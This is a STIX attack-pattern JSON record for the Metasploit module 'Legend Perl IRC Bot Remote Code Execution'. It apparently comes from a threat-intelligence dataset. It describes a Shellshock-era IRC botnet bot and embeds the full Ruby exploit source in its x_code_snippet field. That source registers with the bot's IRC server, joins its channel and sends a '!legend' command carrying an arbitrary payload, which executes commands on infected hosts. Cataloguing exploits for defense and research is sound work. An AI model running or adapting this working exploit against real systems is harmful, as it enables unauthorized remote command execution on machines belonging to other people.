{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a5d4a09-3a21-480a-a5ee-4e5b6c9191af",
    "created": "2024-08-14T17:06:39.913699Z",
    "modified": "2024-08-14T17:06:39.913703Z",
    "name": "Legend Perl IRC Bot Remote Code Execution",
    "description": " This module exploits a remote command execution on the Legend Perl IRC Bot. This bot has been used as a payload in the Shellshock spam last October 2014. This particular bot has functionalities like NMAP scanning, TCP, HTTP, SQL, and UDP flooding, the ability to remove system logs, and ability to gain root, and VNC scanning.  Kevin Stevens, a Senior Threat Researcher at Damballa, has uploaded this script to VirusTotal with a md5 of 11a9f1589472efa719827079c3d13f76. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/legend_bot_exec.rb",
            "external_id": "legend_bot_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.damballa.com/perlbotnado/"
        },
        {
            "source_name": "reference",
            "url": "http://www.csoonline.com/article/2839054/vulnerabilities/report-criminals-use-shellshock-against-mail-servers-to-build-botnet.html#ShellshockspamOctober2014details"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Legend Perl IRC Bot Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a remote command execution on the Legend Perl IRC Bot.\n          This bot has been used as a payload in the Shellshock spam last October 2014.\n          This particular bot has functionalities like NMAP scanning, TCP, HTTP, SQL, and\n          UDP flooding, the ability to remove system logs, and ability to gain root, and\n          VNC scanning.\n\n          Kevin Stevens, a Senior Threat Researcher at Damballa, has uploaded this script\n          to VirusTotal with a md5 of 11a9f1589472efa719827079c3d13f76.\n        },\n      'Author'         =>\n        [\n          'Jay Turla' # msf and initial discovery\n          #MalwareMustDie\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '121681' ],\n          [ 'EDB', '36836' ],\n          [ 'URL', 'https://www.damballa.com/perlbotnado/' ],\n          [ 'URL', 'http://www.csoonline.com/article/2839054/vulnerabilities/report-criminals-use-shellshock-against-mail-servers-to-build-botnet.html' ] # Shellshock spam October 2014 details\n        ],\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Targets'  =>\n        [\n          [ 'Legend IRC Bot', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-04-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6667),\n        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),\n        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),\n        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    connect\n\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      vprint_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      vprint_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    quit(sock)\n    disconnect\n\n    if res =~ /auth/ && res =~ /logged in/\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while !read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e\n      elog(e)\n    end\n\n    data\n  end\n\n  def register(sock)\n    msg = \"\"\n\n    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?\n      msg << \"PASS #{datastore['IRC_PASSWORD']}\\r\\n\"\n    end\n\n    if datastore['NICK'].length > 9\n      nick = rand_text_alpha(9)\n      print_error(\"The nick is longer than 9 characters, using #{nick}\")\n    else\n      nick = datastore['NICK']\n    end\n\n    msg << \"NICK #{nick}\\r\\n\"\n    msg << \"USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\\r\\n\"\n\n    send_msg(sock,msg)\n  end\n\n  def join(sock)\n    join_msg = \"JOIN #{datastore['CHANNEL']}\\r\\n\"\n    send_msg(sock, join_msg)\n  end\n\n  def legend_command(sock)\n    encoded = payload.encoded\n    command_msg = \"PRIVMSG #{datastore['CHANNEL']} :!legend #{encoded}\\r\\n\"\n    send_msg(sock, command_msg)\n  end\n\n  def quit(sock)\n    quit_msg = \"QUIT :bye bye\\r\\n\"\n    sock.put(quit_msg)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Registering with the IRC Server...\")\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      print_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...\")\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      print_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Exploiting the malicious IRC bot...\")\n    legend_command(sock)\n\n    quit(sock)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-27",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}